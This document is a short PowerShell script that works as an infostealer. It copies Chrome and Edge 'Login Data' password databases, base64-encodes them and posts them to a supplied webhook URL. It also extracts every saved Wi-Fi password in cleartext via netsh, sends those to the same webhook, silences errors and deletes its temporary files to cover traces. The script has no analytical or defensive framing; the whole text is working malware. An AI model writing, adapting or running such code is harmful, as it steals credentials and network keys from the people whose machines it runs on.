param([string]$w)
$ErrorActionPreference='SilentlyContinue'
$tmp=Join-Path $env:TEMP ('x'+[guid]::NewGuid().ToString('N').Substring(0,6))
New-Item -ItemType Directory -Force -Path $tmp|Out-Null

$roots=@(
  "$env:LOCALAPPDATA\Google\Chrome\User Data",
  "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
)
foreach($r in $roots){
  if(!(Test-Path $r)){continue}
  Get-ChildItem $r -Directory -EA 0|ForEach-Object{
    $ld=Join-Path $_.FullName 'Login Data'
    if(Test-Path $ld){
      $cp=Join-Path $tmp ($_.Name+'.db')
      Copy-Item $ld $cp -Force
      $b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($cp))
      $body=@{content="``````$($_.Name)``````\n$b64"}|ConvertTo-Json
      Invoke-RestMethod -Uri $w -Method Post -Body $body -ContentType 'application/json'
    }
  }
}

$names=(netsh wlan show profiles)|Select-String 'All User Profile'|ForEach-Object{($_ -split ':')[-1].Trim()}
foreach($n in $names){
  $d=netsh wlan show profile name="$n" key=clear|Out-String
  $body=@{content="``````WiFi $n``````\n$d"}|ConvertTo-Json
  Invoke-RestMethod -Uri $w -Method Post -Body $body -ContentType 'application/json'
}

Remove-Item $tmp -Recurse -Force -EA 0